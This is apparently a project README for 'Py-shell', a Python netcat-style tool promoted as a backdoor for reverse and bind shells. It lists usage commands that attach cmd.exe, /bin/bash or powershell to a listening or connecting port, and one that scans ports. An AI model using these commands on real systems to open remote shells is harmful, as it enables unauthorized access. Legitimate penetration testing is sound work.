## Py-shell - The best python backdoor shell in the world.

We can absolutely sure this is the best PYTHON SHELL in the 
world until now. You can try it now.

Python netcat for reverse or bind shell. Py-shell is a custom 
network tool to create backdoor shell (pentesting) and some 
other network purpose like connection testing or remote command 
excution (for who want to help others remotely).

Usage:

**python3 pyshell.py -l -p [PORT] -e [FILENAME]**

**python3 pyshell.py -t [ADDRESS] -p [PORT] -e [FILENAME]**

****
Example usage:


*python3 pyshell.py -l -p 4444 -v*

*python3 pyshell.py -t 127.0.0.1 -p 4444*

*python3 pyshell.py -l -p 8080 -e cmd.exe*

*python3 pyshell.py -t 127.0.0.1 -p 8080 -e /bin/bash*

*python3 pyshell.py -l -p 5000 -e powershell*

*python3 pyshell.py -t 127.0.0.1 -p 8000-8081 -z*



Created by toidihack(hacking at HackerOne and Bugcrowd)
 
